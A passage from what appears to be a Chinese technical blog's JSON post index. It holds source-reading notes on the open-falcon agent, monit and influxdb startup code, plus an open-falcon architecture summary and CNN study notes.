strings.HasPrefix(arr[i], \"name=\") {\n\t\t\t\t\t\ttmpMap[1] = strings.TrimSpace(arr[i][5:])\n\t\t\t\t\t} else if strings.HasPrefix(arr[i], \"cmdline=\") {\n\t\t\t\t\t\ttmpMap[2] = strings.TrimSpace(arr[i][8:])\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tprocs[metric.Tags] = tmpMap\n\t\t\t}\n\t\t}\n\n\t\tg.SetReportUrls(urls)\n\t\tg.SetReportPorts(ports)\n\t\tg.SetReportProcs(procs)\n\t\tg.SetDuPaths(paths)\n\n\t}\n}\n```\n\n获取信任IP列表：\n\n```go\nfunc syncTrustableIps() {\n\n\tduration := time.Duration(g.Config().Heartbeat.Interval) * time.Second\n\n\tfor {\n\t\ttime.Sleep(duration)\n\n\t\tvar ips string\n        // 调用hbs接口来获取信任ip列表，用于给http接口查询认证使用/\n\t\terr := g.HbsClient.Call(\"Agent.TrustableIps\", model.NullRpcRequest{}, &ips)\n\t\tif err != nil {\n\t\t\tlog.Println(\"ERROR: call Agent.TrustableIps fail\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\tg.SetTrustableIps(ips)\n\t}\n}\n```\n\n收集指标数据collector\n\n```go\nfunc Collect() {\n\n\tif !g.Config().Transfer.Enabled {\n\t\treturn\n\t}\n\n\tif len(g.Config().Transfer.Addrs) == 0 {\n\t\treturn\n\t}\n\n\tfor _, v := range funcs.Mappers {\n\t\tgo collect(int64(v.Interval), v.Fs)\n\t}\n}\n```\n\n函数collect\n\n```go\nfunc collect(sec int64, fns []func() []*model.MetricValue) {\n\tt := time.NewTicker(time.Second * time.Duration(sec))\n\tdefer t.Stop()\n    // 根据获取到的map的指标的数组，去抓取数据\n\tfor {\n\t\t<-t.C\n\t\t// hostname\n\t\thostname, err := g.Hostname()\n\t\tif err != nil {\n\t\t\tcontinue\n\t\t}\n\n\t\tmvs := []*model.MetricValue{}\n         // 获取忽略指标\n\t\tignoreMetrics := g.Config().IgnoreMetrics\n\n\t\tfor _, fn := range fns {\n\t\t\titems := fn()\n\t\t\tif items == nil {\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tif len(items) == 0 {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\t\n\t\t\tfor _, mv := range items {\n\t\t\t\tif b, ok := ignoreMetrics[mv.Metric]; ok && b {\n\t\t\t\t\tcontinue\n\t\t\t\t} else {\n\t\t\t\t\tmvs = append(mvs, mv)\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tnow := time.Now().Unix()\n\t\tfor j := 0; j < len(mvs); j++ {\n\t\t\tmvs[j].Step = sec\n\t\t\tmvs[j].Endpoint = hostname\n\t\t\tmvs[j].Timestamp = now\n\t\t}\n\t\t// 发送数据到transfer\n\t\tg.SendToTransfer(mvs)\n\n\t}\n}\n```\n\n数据发送函数SendToTransfer：\n\n```go\nfunc SendToTransfer(metrics []*model.MetricValue) {\n\tif len(metrics) == 0 {\n\t\treturn\n\t}\n\n\tdt := Config().DefaultTags\n\tif len(dt) > 0 {\n\t\tvar buf bytes.Buffer\n\t\tdefault_tags_list := []string{}\n\t\tfor k, v := range dt {\n\t\t\tbuf.Reset()\n\t\t\tbuf.WriteString(k)\n\t\t\tbuf.WriteString(\"=\")\n\t\t\tbuf.WriteString(v)\n\t\t\tdefault_tags_list = append(default_tags_list, buf.String())\n\t\t}\n\t\tdefault_tags := strings.Join(default_tags_list, \",\")\n\n\t\tfor i, x := range metrics {\n\t\t\tbuf.Reset()\n\t\t\tif x.Tags == \"\" {\n\t\t\t\tmetrics[i].Tags = default_tags\n\t\t\t} else {\n\t\t\t\tbuf.WriteString(metrics[i].Tags)\n\t\t\t\tbuf.WriteString(\",\")\n\t\t\t\tbuf.WriteString(default_tags)\n\t\t\t\tmetrics[i].Tags = buf.String()\n\t\t\t}\n\t\t}\n\t}\n\n\tdebug := Config().Debug\n\n\tif debug {\n\t\tlog.Printf(\"=> <Total=%d> %v\\n\", len(metrics), metrics[0])\n\t}\n\n\tvar resp model.TransferResponse\n    // 最重要的地方，发送数据\n\tSendMetrics(metrics, &resp)\n\n\tif debug {\n\t\tlog.Println(\"<=\", &resp)\n\t}\n}\n```\n\n```go\nfunc SendMetrics(metrics []*model.MetricValue, resp *model.TransferResponse) {\n\trand.Seed(time.Now().UnixNano())\n\tfor _, i := range rand.Perm(len(Config().Transfer.Addrs)) {\n\t\taddr := Config().Transfer.Addrs[i]\n\t\t// 获取transfer的客户端\n\t\tc := getTransferClient(addr)\n\t\tif c == nil {\n            //没有就初始化一个\n\t\t\tc = initTransferClient(addr)\n\t\t}\n\t\t//抓取数据\n\t\tif updateMetrics(c, metrics, resp) {\n\t\t\tbreak\n\t\t}\n\t}\n}\n```\n\n调用transfer模块的rpc接口update来更新数据：\n\n```go\n\nfunc updateMetrics(c *SingleConnRpcClient, metrics []*model.MetricValue, resp *model.TransferResponse) bool {\n\terr := c.Call(\"Transfer.Update\", metrics, resp)\n\tif err != nil {\n\t\tlog.Println(\"call Transfer.Update fail:\", c, err)\n\t\treturn false\n\t}\n\treturn true\n}\n```\n\n最后启动http服务，启动服务之前需要初始化init函数:\n\n```go\nfunc init() {\n\tconfigAdminRoutes()  // 初始化admin接口路由\n\tconfigCpuRoutes()    // 初始化cpu接口路由\n\tconfigDfRoutes()     // 初始化磁盘接口路由\n\tconfigHealthRoutes()   // 初始化健康度路由\n\tconfigIoStatRoutes()   //初始化io\n\tconfigKernelRoutes()   //初始化内核\n\tconfigMemoryRoutes()   //初始化memory\n\tconfigPageRoutes()    //初始化page\n\tconfigPluginRoutes()   //初始化插件\n\tconfigPushRoutes()     //初始化push, 可以使用push接口推送数据，通过这个接口转发到transfer\n\tconfigRunRoutes()      //初始化Run\n\tconfigSystemRoutes()    //初始化系统\n}\n```\n\n启动http服务Start函数：\n\n```go\nfunc Start() {\n\tif !g.Config().Http.Enabled {\n\t\treturn\n\t}\n\n\taddr := g.Config().Http.Listen\n\tif addr == \"\" {\n\t\treturn\n\t}\n\n\ts := &http.Server{\n\t\tAddr:           addr,\n\t\tMaxHeaderBytes: 1 << 30,\n\t}\n\n\tlog.Println(\"listening\", addr)\n\tlog.Fatalln(s.ListenAndServe())\n}\n```\n\n补充一点：这些接口都是开放的api，dashboard中请求的数据接口是自己实现从数据库中查询的。dashboard中接口时基于django编写了接口，然后用js来查询这些接口数据。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"redis 源码思维导图","url":"/2020/01/20/redis源码分析思维导图/","content":"\n## redis 源码思维导图\n\n本人画的redis源码思维导图，有点乱，自己凑合着看看吧~~ orz..\n\n![redis-server](/images/redis-server.png)","tags":["redis"],"categories":["redis"]},{"title":"open-falcon 架构","url":"/2020/01/20/open-falcon框架学习/","content":"\n## open-falcon 架构\n\nopen-falcon 主要架构图：\n\n![open-falcon architecture](/images/func_intro_1.png)\n\n各个模块说明：\n\nagent 组件：\n\n目前 agent 服务已经覆盖公司大部分机器，一个自动采集机器指标的自动化服务。\n\n数据上报支持三种方式: \n\n1. agent 自采集基础监控上报；\n\n2. 用户自定义推送数据 (数据按照指定格式推送到本地 agent 端口)；\n\n3. 插件采集上报。\n\nhbs 组件：\n\n心跳服务器，定时从 DB 获取节点与主机对应关系、插件与节点绑定列表、模板、策略、全局策略等信息；将插件与节点绑定关系解析为插件与主机一一对应关系，并提供 rpc 接口方便所有 agent 查询；将 agent 上报的版本信息、插件信息写入 falcon 数据库；将模板、策略解析为策略与主机的关系对应表，与全局策略一起，以 rpc 方式提供给 judge 服务，方便其定时获取。\n\ntransfer 组件：\n\n启动时维护两个一致性哈希列表，分别对应 graph 服务与 judge 服务，用于通过 endpoint 和 counter 计算得到的 MD5，定位每条监控数据应该存储到哪个 graph 实例和 judge 实例；提供数据转发功能，将 agent 通过 rpc 上报的监控数据，通过一致性哈希定位后，上报给相应的 graph 实例和 judge 实例；使用 rpc 接口提供 history 监控数据查询功能，用于绘图展示等。\n\ngraph 组件：\n\n接入 rrdtool，用于监控数据持久化，通过 endpoint 和 counter 计算的 MD5 确定文件名；提供 rpc 接口，接收 transfer 上报的监控数据，并支持缓存，每个监控数据缓存半小时后再做数据持久化以减轻磁盘 IO 压力，提高整体吞吐量；提供索引缓存，每一个监控数据上报后，通过 endpoint、counter、step、timestamp 构建缓存，如果已存在则更新 timestamp，否则新建并上报至 graph 数据库；提供历史监控数据查询的 rpc 接口，便于 transfer 调用查询，查询时先通过索引缓存确认相应的 endpoint、counter 是否存在，如果存在则查询合并 rrd 文件中持久化数据与缓存数据并返回，否则直接返回。\n\njudge 组件：\n\n定时从 hbs 服务获取主机与策略的一一对应关系、以及全局策略，统称告警策略，用于告警判别；提供 rpc 接口，用于接收 transfer 上报的监控数据，收到每条数据时，遍历所有告警策略，如果符合告警条件，则将告警策略和监控数据存储到 redis 队列。\n\nalarm 组件：\n\n不停遍历 redis 队列，从中取出 judge 存储的告警策略和监控数据，写入报警数据库，然后依照告警策略中配置的告警组和获取告警成员的联系方式，和告警形成一一对应的关系，上报给 redis，方便 alarm 的下游服务进行告警发送。\n\naggregator 组件：\n\n集群监控的本质是一个聚合功能。单台机器的监控指标难以反应整个集群的情况，我们需要把整个集群的机器（体现为 xbox 某个节点下的机器）综合起来看。比如所有机器的 qps 加和才是整个集群的 qps，所有机器的 request_fail 数量 ÷ 所有机器的 request_total 数量 = 整个集群的请求失败率。我们计算出集群的某个整体指标之后，也会有 “查看该指标的历史趋势图” “为该指标配置报警” 这种需求，故而，我们会把这个指标重新 push 回监控 server 端，于是，你就可以把她当成一个普通 counter 来对待了。\n\nnodata 组件：\n\nnodata 能够和 judge 一起，监测采集项的上报异常，过程为: 配置了 nodata 的采集项超时未上报数据，nodata 生成一条非法的 mock 数据；用户在 judge 上配置相应的报警策略，收到 mock 数据就产生报警。采集项上报异常检测，作为 judge 的一个必要补充，能够使 judge 的实时报警功能更加完善、可靠。nodata 只为少数重要的采集项服务，其处理的采集项的数量，应该不多于 judge 的十分之一。滥用 nodata，将会给 falcon 的运维管理带来很多问题。通常 nodata 按照 step 从绘图中取不到打点数据时候，当然是有一定的容错 step，一般我们控制在 2 到 3 个 step。\n","tags":["monitor"],"categories":["monitor"]},{"title":"CNN学习笔记","url":"/2020/01/19/CNN学习/","content":"\n## CNN学习笔记\n\n**从神经网络到卷积神经网络（CNN）**\n\n![img](/images/1093303-20170430194200912-687300437.jpg)\n\n**卷积神经网络的层级结构**\n   • 数据输入层/ Input layer\n　• 卷积计算层/ CONV layer\n　• ReLU激励层 / ReLU layer\n　• 池化层 / Pooling layer\n　• 全连接层 / FC layer\n\n### **数据输入层**\n\n该层要做的处理主要是对原始图像数据进行预处理，其中包括：\n\n去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。\n\n 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。\n\nPCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化\n\n去均值与归一化效果图：\n\n![img](/images/1093303-20170430194338194-1949897491.jpg)\n\n去相关与白化效果图：\n\n![img](/images/1093303-20170430194357553-1200745791.jpg)\n\n### **卷积计算层**\n\n局部关联。每个神经元看做一个滤波器(filter)\n\n窗口(receptive field)滑动， filter对局部数据计算\n\n深度/depth\n\n步长/stride （窗口一次滑动的长度）\n\n填充值/zero-padding\n\n![img](/images/1093303-20170430194425147-845167791.png)\n\n![img](/images/1093303-20190120113539659-455066516.gif)\n\n**参数共享机制**\n\n在卷积层中每个神经元连接数据窗的权重是固定的，每个神经元只关注一个特性。神经元就是图像处理中的滤波器，比如边缘检测专用的Sobel滤波器，即卷积层的每个滤波器都会有自己所关注一个图像特征，比如垂直边缘，水平边缘，颜色，纹理等等，这些所有神经元加起来就好比就是整张图像的特征提取器集合。\n\n一组固定的权重和不同窗口内数据做内积: 卷积\n\n### **激励层**\n\n把卷积层输出结果做非线性映射。\n\n![img](/images/1093303-20170430194934006-705271151.jpg)\n\nCNN采用的激励函数一般为ReLU(The Rectified Linear Unit/修正线性单元)                 \n\n激励层的实践经验：\n不要用sigmoid！不要用sigmoid！不要用sigmoid！\n首先试RELU，因为快，但要小心点\n如果2失效，请用Leaky ReLU或者Maxout\n某些情况下tanh倒是有不错的结果，但是很少\n\n### **池化层**\n\n池化层夹在连续的卷积层中间， 用于压缩数据和参数的量，减小过拟合。\n简而言之，如果输入是图像的话，那么池化层的最主要作用就是压缩图像。\n\n1. 特征不变性，也就是我们在图像处理中经常提到的特征的尺度不变性，池化操作就是图像的resize，平时一张狗的图像被缩小了一倍我们还能认出这是一张狗的照片，这说明这张图像中仍保留着狗最重要的特征，我们一看就能判断图像中画的是一只狗，图像压缩时去掉的信息只是一些无关紧要的信息，而留下的信息则是具有尺度不变性的特征，是最能表达图像的特征。\n2. 特征降维，我们知道一幅图像含有的信息是很大的，特征也很多，但是有些信息对于我们做图像任务时没有太多用途或者有重复，我们可以把这类冗余信息去除，把最重要的特征抽取出来，这也是池化操作的一大作用。\n3. 在一定程度上防止过拟合，更方便优化。\n\n![img](/images/1093303-20170430195028600-318072954.jpg)\n\n\n\n池化层用的方法有Max pooling 和 average pooling，而实际用的较多的是Max pooling。\n\nMax pooling：\n\n对于每个2*2的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个2*2窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。\n\n### **全连接层**\n\n![img](/images/1093303-20170430195130772-454262568.jpg)\n\n**一般CNN结构依次为**\n　　1. INPUT\n　　2. [[CONV -> RELU]*N -> POOL?]*M \n　　3. [FC -> RELU]*K\n　　4. FC\n\n**卷积神经网络之优缺点**：\n\n优点：\n共享卷积核，对高维数据处理无压力\n无需手动选取特征，训练好权重，即得特征分类效果好\n缺点：\n需要调参，需要大样本量，训练最好要GPU\n物理含义不明确\n\n**总结**\n卷积网络在本质上是一种输入到输出的映射，它能够学习大量的输入与输出之间的映射关系，而不需要任何输入和输出之间的精确的数学表达式，只要用已知的模式对卷积网络加以训练，网络就具有输入输出对之间的映射能力。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["深度学习"],"categories":["深度学习"]},{"title":"monit代码分析","url":"/2020/01/17/monit学习/","content":"\n## monit代码分析\n\n主要流程main函数:\n\n```c\n/**\n * The Prime mover\n */\nint main(int argc, char **argv) {\n        Bootstrap(); // Bootstrap libmonit  //初始化代码\n        Bootstrap_setAbortHandler(vLogAbortHandler);  // Abort Monit on exceptions thrown by libmonit\n        Bootstrap_setErrorHandler(vLogError);\n        setlocale(LC_ALL, \"C\");\n        prog = File_basename(argv[0]);\n#ifdef HAVE_OPENSSL\n        Ssl_start();\n#endif\n        init_env();\n        handle_options(argc, argv);\n        do_init();\n        do_action(argc, argv);\n        do_exit(false);\n        return 0;\n}\n```\n\nBootstrap函数：\n\n ```c\nBootstrap:\nvoid Bootstrap(void) {\n        Exception_init();\n        Thread_init();\n}\n\n ```\n\nSsl_start函数，加载ssl协议\n\n```c\nvoid Ssl_start() {\n#if (OPENSSL_VERSION_NUMBER < 0x10100000L) || defined(LIBRESSL_VERSION_NUMBER)\n        SSL_library_init();\n        SSL_load_error_strings();\n        int locks = CRYPTO_num_locks();\n        instanceMutexTable = CALLOC(locks, sizeof(Mutex_T));\n        for (int i = 0; i < locks; i++)\n                Mutex_init(instanceMutexTable[i]);\n        CRYPTO_THREADID_set_callback(_threadID);\n        CRYPTO_set_locking_callback(_mutexLock);\n#endif\n        if (File_exist(URANDOM_DEVICE))\n                RAND_load_file(URANDOM_DEVICE, RANDOM_BYTES);\n        else if (File_exist(RANDOM_DEVICE))\n                RAND_load_file(RANDOM_DEVICE, RANDOM_BYTES);\n        else\n                THROW(AssertException, \"SSL: cannot find %s nor %s on the system\", URANDOM_DEVICE, RANDOM_DEVICE);\n}\n```\n\n初始化环境：\n\n```c\n/**\n * Initialize the program environment\n *\n * @see https://bitbucket.org/tildeslash/monit/commits/cd545838378517f84bdb0989cadf461a19d8ba11\n */\nvoid init_env() {\n        Util_closeFds();\n        // Ensure that std descriptors (0, 1 and 2) are open\n        int devnull = open(\"/dev/null\", O_RDWR);\n        if (devnull == -1) {\n                THROW(AssertException, \"Cannot open /dev/null -- %s\", STRERROR);\n        }\n        for (int i = 0; i < 3; i++) {\n                struct stat st;\n                if (fstat(i, &st) == -1) {\n                        if (dup2(devnull, i) < 0) {\n                                close(devnull);\n                                THROW(AssertException, \"dup2 failed -- %s\", STRERROR);\n                        }\n                }\n        }\n        close(devnull);\n        // Get password struct with user info\n        char buf[4096];\n        struct passwd pw, *result = NULL;\n        if (getpwuid_r(geteuid(), &pw, buf, sizeof(buf), &result) != 0 || ! result)\n                THROW(AssertException, \"getpwuid_r failed -- %s\", STRERROR);\n        Run.Env.home = Str_dup(pw.pw_dir);\n        Run.Env.user = Str_dup(pw.pw_name);\n        // Get CWD\n        char t[PATH_MAX];\n        if (! Dir_cwd(t, PATH_MAX))\n                THROW(AssertException, \"Monit: Cannot read current directory -- %s\", STRERROR);\n        Run.Env.cwd = Str_dup(t);\n}\n\n```\n\nhandle_options函数处理传参情况：\n\ndo_init函数初始化文件和服务\n\n```c\n/**\n * Initialize this application - Register signal handlers,\n * Parse the control file and initialize the program's\n * datastructures and the log system.\n */\nstatic void do_init() {\n        /*\n         * Register interest for the SIGTERM signal,\n         * in case we run in daemon mode this signal\n         * will terminate a running daemon.\n         */\n        signal(SIGTERM, do_destroy);\n\n        /*\n         * Register interest for the SIGUSER1 signal,\n         * in case we run in daemon mode this signal\n         * will wakeup a sleeping daemon.\n         */\n        signal(SIGUSR1, do_wakeup);\n\n        /*\n         * Register interest for the SIGINT signal,\n         * in case we run as a server but not as a daemon\n         * we need to catch this signal if the user pressed\n         * CTRL^C in the terminal\n         */\n        signal(SIGINT, do_destroy);\n\n        /*\n         * Register interest for the SIGHUP signal,\n         * in case we run in daemon mode this signal\n         * will reload the configuration.\n         */\n        signal(SIGHUP, do_reload);\n\n        /*\n         * Register no interest for the SIGPIPE signal,\n         */\n        signal(SIGPIPE, SIG_IGN);\n\n        /*\n         * Initialize the random number generator\n         */\n        srandom((unsigned)(Time_now() + getpid()));\n\n        /*\n         * Initialize the Runtime mutex. This mutex\n         * is used to synchronize handling of global\n         * service data\n         */\n        Mutex_init(Run.mutex);\n\n        /*\n         * Initialize heartbeat mutex and condition\n         */\n        Mutex_init(heartbeatMutex);\n        Sem_init(heartbeatCond);\n\n        /*\n         * Get the position of the control file\n         */\n        if (! Run.files.control)\n                Run.files.control = file_findControlFile();\n\n        /*\n         * Initialize the system information data collecting interface\n         */\n        if (init_system_info())\n                Run.flags |= Run_ProcessEngineEnabled;\n\n        /*\n         * Start the Parser and create the service list. This will also set\n         * any Runtime constants defined in the controlfile.\n         */\n        if (! parse(Run.files.control))\n                exit(1);\n\n        /*\n         * Initialize the log system\n         */\n        if (! log_init())\n                exit(1);\n\n        /*\n         * Did we find any service ?\n         */\n        if (! servicelist) {\n                LogError(\"No service has been specified\\n\");\n                exit(0);\n        }\n\n        /*\n         * Initialize Runtime file variables\n         */\n        file_init();\n\n        /*\n         * Should we print debug information ?\n         */\n        if (Run.debug) {\n                Util_printRunList();\n                Util_printServiceList();\n        }\n\n        /*\n         * Reap any stray child processes we may have created\n         */\n        atexit(waitforchildren);\n}\n```\n\nfile_findControlFile()函数，读取配置文件，corefoundation\n\n```c\nchar *file_findControlFile() {\n        char *rcfile = CALLOC(sizeof(char), STRLEN + 1);\n        snprintf(rcfile, STRLEN, \"%s/.%s\", Run.Env.home, MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"/etc/%s\", MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"%s/%s\", SYSCONFDIR, MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        snprintf(rcfile, STRLEN, \"/usr/local/etc/%s\", MONITRC);\n        if (File_exist(rcfile)) {\n                return rcfile;\n        }\n        if (File_exist(MONITRC)) {\n                snprintf(rcfile, STRLEN, \"%s/%s\", Run.Env.cwd, MONITRC);\n                return rcfile;\n        }\n        LogError(\"Cannot find the Monit control file at ~/.%s, /etc/%s, %s/%s, /usr/local/etc/%s or at ./%s \\n\", MONITRC, MONITRC, SYSCONFDIR, MONITRC, MONITRC, MONITRC);\n        exit(1);\n}\n```\n\ndo_action主流程:\n\n```c\n/**\n * Dispatch to the submitted action - actions are program arguments\n */\nstatic void do_action(int argc, char **args) {\n        char *action = args[optind];\n\n        Run.flags |= Run_Once;\n\n        if (! action) {\n                do_default();\n        } else if (IS(action, \"start\")     ||\n                   IS(action, \"stop\")      ||\n                   IS(action, \"monitor\")   ||\n                   IS(action, \"unmonitor\") ||\n                   IS(action, \"restart\")) {\n                char *service = args[++optind];\n                if (Run.mygroup || service) {\n                        int errors = 0;\n                        List_T services = List_new();\n                        if (Run.mygroup) {\n                                for (ServiceGroup_T sg = servicegrouplist; sg; sg = sg->next) {\n                                        if (IS(Run.mygroup, sg->name)) {\n                                                for (list_t m = sg->members->head; m; m = m->next) {\n                                                        Service_T s = m->e;\n                                                        List_append(services, s->name);\n                                                }\n                                                break;\n                                        }\n                                }\n                                if (List_length(services) == 0) {\n                                        List_free(&services);\n                                        LogError(\"Group '%s' not found\\n\", Run.mygroup);\n                                        exit(1);\n                                }\n                        } else if (IS(service, \"all\")) {\n                                for (Service_T s = servicelist; s; s = s->next)\n                                        List_append(services, s->name);\n                        } else {\n                                List_append(services, service);\n                        }\n                        errors = exist_daemon() ? (HttpClient_action(action, services) ? 0 : 1) : control_service_string(services, action);\n                        List_free(&services);\n                        if (errors)\n                                exit(1);\n                } else {\n                        LogError(\"Please specify a service name or 'all' after %s\\n\", action);\n                        exit(1);\n                }\n        } else if (IS(action, \"reload\")) {\n                LogInfo(\"Reinitializing %s daemon\\n\", prog);\n                kill_daemon(SIGHUP);\n        } else if (IS(action, \"status\")) {\n                char *service = args[++optind];\n                if (! HttpClient_status(Run.mygroup, service))\n                        exit(1);\n        } else if (IS(action, \"summary\")) {\n                char *service = args[++optind];\n                if (! HttpClient_summary(Run.mygroup, service))\n                        exit(1);\n        } else if (IS(action, \"report\")) {\n                char *type = args[++optind];\n                if (! HttpClient_report(type))\n                        exit(1);\n        } else if (IS(action, \"procmatch\")) {\n                char *pattern = args[++optind];\n                if (! pattern) {\n                        printf(\"Invalid syntax - usage: procmatch \\\"<pattern>\\\"\\n\");\n                        exit(1);\n                }\n                ProcessTree_testMatch(pattern);\n        } else if (IS(action, \"quit\")) {\n                kill_daemon(SIGTERM);\n        } else if (IS(action, \"validate\")) {\n                if (do_wakeupcall()) {\n                        char *service = args[++optind];\n                        HttpClient_status(Run.mygroup, service);\n                } else {\n                        _validateOnce();\n                }\n                exit(1);\n        } else {\n                LogError(\"Invalid argument -- %s  (-h will show valid arguments)\\n\", action);\n                exit(1);\n        }\n}\n```\n\naction= start stop monitor unmonitor restart 通过维护一个服务列表发送post请求给服务端来启动服务。\n\ndo_default主要启动服务的函数\n\n```c\n/**\n * Default action - become a daemon if defined in the Run object and\n * run validate() between sleeps. If not, just run validate() once.\n * Also, if specified, start the monit http server if in deamon mode.\n */\nstatic void do_default() {\n        if (Run.flags & Run_Daemon) {\n                if (do_wakeupcall())\n                        exit(0);\n\n                Run.flags &= ~Run_Once;\n                if (can_http()) {\n                        if (Run.httpd.flags & Httpd_Net)\n                                LogInfo(\"Starting Monit %s daemon with http interface at [%s]:%d\\n\", VERSION, Run.httpd.socket.net.address ? Run.httpd.socket.net.address : \"*\", Run.httpd.socket.net.port);\n                        else if (Run.httpd.flags & Httpd_Unix)\n                                LogInfo(\"Starting Monit %s daemon with http interface at %s\\n\", VERSION, Run.httpd.socket.unix.path);\n                } else {\n                        LogInfo(\"Starting Monit %s daemon\\n\", VERSION);\n                }\n\n                if (! (Run.flags & Run_Foreground))\n                        daemonize();\n\n                if (! file_createPidFile(Run.files.pid)) {\n                        LogError(\"Monit daemon died\\n\");\n                        exit(1);\n                }\n\n                if (! State_open())\n                        exit(1);\n                State_restore();\n\n                atexit(file_finalize);\n\n                if (Run.startdelay && State_reboot()) {\n                        time_t now = Time_now();\n                        time_t delay = now + Run.startdelay;\n\n                        LogInfo(\"Monit will delay for %ds on first start after reboot ...\\n\", Run.startdelay);\n\n                        /* sleep can be interrupted by signal => make sure we paused long enough */\n                        while (now < delay) {\n                                sleep((unsigned int)(delay - now));\n                                if (Run.flags & Run_Stopped)\n                                        do_exit(false);\n                                now = Time_now();\n                        }\n                }\n\n                if (can_http())\n                        monit_http(Httpd_Start);\n\n                /* send the monit startup notification */\n                Event_post(Run.system, Event_Instance, State_Changed, Run.system->action_MONIT_START, \"Monit %s started\", VERSION);\n\n                if (Run.mmonits) {\n                        Thread_create(heartbeatThread, heartbeat, NULL);\n                        heartbeatRunning = true;\n                }\n\n                while (true) {\n                        validate();\n\n                        /* In the case that there is no pending action then sleep */\n                        if (! (Run.flags & Run_ActionPending) && ! interrupt())\n                                sleep(Run.polltime);\n\n                        if (Run.flags & Run_DoWakeup) {\n                                Run.flags &= ~Run_DoWakeup;\n                                LogInfo(\"Awakened by User defined signal 1\\n\");\n                        }\n\n                        if (Run.flags & Run_Stopped) {\n                                do_exit(true);\n                        } else if (Run.flags & Run_DoReload) {\n                                do_reinit();\n                        } else {\n                                State_saveIfDirty();\n                        }\n                }\n        } else {\n                _validateOnce();\n        }\n}\n```\n\ndo_wakeupcall调用函数是否需要唤醒进程。\n\ncan_http()判断是否可以启动http.\n\ndaemonize()函数：\n\n```c\n/**\n * Transform a program into a daemon. Inspired by code from Stephen\n * A. Rago's book, Unix System V Network Programming.\n */\nvoid daemonize() {\n        pid_t pid;\n        /*\n         * Become a session leader to lose our controlling terminal\n         */\n        if ((pid = fork ()) < 0) {\n                LogError(\"Cannot fork a new process\\n\");\n                exit (1);\n        } else if (pid != 0) {\n                _exit(0);\n        }\n        setsid();\n        if ((pid = fork ()) < 0) {\n                LogError(\"Cannot fork a new process\\n\");\n                exit (1);\n        } else if (pid != 0) {\n                _exit(0);\n        }\n        /*\n         * Change current directory to the root so that other file systems can be unmounted while we're running\n         */\n        if (chdir(\"/\") < 0) {\n                LogError(\"Cannot chdir to / -- %s\\n\", STRERROR);\n                exit(1);\n        }\n        /*\n         * Attach standard descriptors to /dev/null. Other descriptors should be closed in env.c\n         */\n        Util_redirectStdFds();\n}\n```\n\nfile_createPidFile场景pid文件。\n\n服务数据结构，所有的服务数据结构都在monit.h文件中\n\nyacc flex解析\n\n使用flex词法解析器，yacc语法解析器。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["monitor"],"categories":["monitor"]},{"title":"influxdb","url":"/2020/01/17/influxdb1/","content":"\n### influxdb 启动流程学习笔记\n\n#### 流程分析\n\n本文基于influxdb 1.4来进行分析代码\n\ninfluxdb入口文件在 /cmd/influxd/main.go文件中\n\n```go\n// 主函数\nfunc main() {\n\trand.Seed(time.Now().UnixNano())\n\t//初始化\n\tm := NewMain()\n    // Run \n\tif err := m.Run(os.Args[1:]...); err != nil {\n\t\tfmt.Fprintln(os.Stderr, err)\n\t\tos.Exit(1)\n\t}\n}\n```\n\nNewMain函数初始化一个实例\n\n```go\n// NewMain return a new instance of Main.\nfunc NewMain() *Main {\n\treturn &Main{\n\t\tStdin:  os.Stdin,\n\t\tStdout: os.Stdout,\n\t\tStderr: os.Stderr,\n\t}\n}\n```\n\n主要流程在Run函数中，\n\n```go\n// Run determines and runs the command specified by the CLI args.\nfunc (m *Main) Run(args ...string) error {\n\tname, args := cmd.ParseCommandName(args)\n\n\t// Extract name from args.\n\tswitch name {\n\tcase \"\", \"run\":\n        // 默认执行流程\n\t\tcmd := run.NewCommand()\n\n\t\t// Tell the server the build details.\n\t\tcmd.Version = version\n\t\tcmd.Commit = commit\n\t\tcmd.Branch = branch\n\n        // 执行主要的函数\n\t\tif err := cmd.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"run: %s\", err)\n\t\t}\n\t\t//中断信号量\n\t\tsignalCh := make(chan os.Signal, 1)\n\t\tsignal.Notify(signalCh, os.Interrupt, syscall.SIGTERM)\n\t\tcmd.Logger.Info(\"Listening for signals\")\n\n\t\t// Block until one of the signals above is received\n\t\t<-signalCh\n\t\tcmd.Logger.Info(\"Signal received, initializing clean shutdown...\")\n\t\tgo cmd.Close()\n\n\t\t// Block again until another signal is received, a shutdown timeout elapses,\n\t\t// or the Command is gracefully closed\n\t\tcmd.Logger.Info(\"Waiting for clean shutdown...\")\n\t\tselect {\n\t\tcase <-signalCh:\n\t\t\tcmd.Logger.Info(\"Second signal received, initializing hard shutdown\")\n\t\tcase <-time.After(time.Second * 30):\n\t\t\tcmd.Logger.Info(\"Time limit reached, initializing hard shutdown\")\n\t\tcase <-cmd.Closed:\n\t\t\tcmd.Logger.Info(\"Server shutdown completed\")\n\t\t}\n\n\t\t// goodbye.\n\n\tcase \"backup\":\n        //备份\n\t\tname := backup.NewCommand()\n\t\tif err := name.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"backup: %s\", err)\n\t\t}\n\tcase \"restore\":\n        //恢复\n\t\tname := restore.NewCommand()\n\t\tif err := name.Run(args...); err != nil {\n\t\t\treturn fmt.Errorf(\"restore: %s\", err)\n\t\t}\n\tcase 